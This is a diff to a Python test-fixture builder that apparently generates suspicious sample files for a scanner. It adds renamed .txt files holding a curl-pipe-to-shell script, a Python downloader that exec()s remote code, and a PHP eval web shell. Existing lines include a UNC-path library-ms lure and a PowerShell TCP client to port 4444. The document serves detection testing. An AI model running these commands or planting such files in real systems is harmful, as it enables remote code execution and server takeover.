@@ -259,6 +259,10 @@ def build_folder(root):
     w("lure.library-ms", b'<?xml version="1.0"?><libraryDescription><searchConnectorDescription>'
                           b'<simpleLocation><url>file://\\\\1.2.3.4\\share</url></simpleLocation>'
                           b'</searchConnectorDescription></libraryDescription>')
+    w("renamed.sh.txt", b"#!/bin/bash\ncurl -fsSL http://11.1.1.1/x.sh | sh\n")
+    w("renamed.py.txt", b"#!/usr/bin/env python3\nimport urllib.request\n"
+                         b"d = urllib.request.urlopen('http://11.1.1.1/x').read()\nexec(d)\n")
+    w("renamed.php.txt", b"<?php\n@eval($_POST['cmd']);\n?>\n")
     w("pipe.sh", b"eval \"$(curl -fsSL http://6.6.6.6/x.sh)\"\n")
     w("tcpclient.ps1", b"$c = New-Object System.Net.Sockets.TcpClient('2.2.2.2', 4444)\n"
                         b"$s = $c.GetStream()\n")
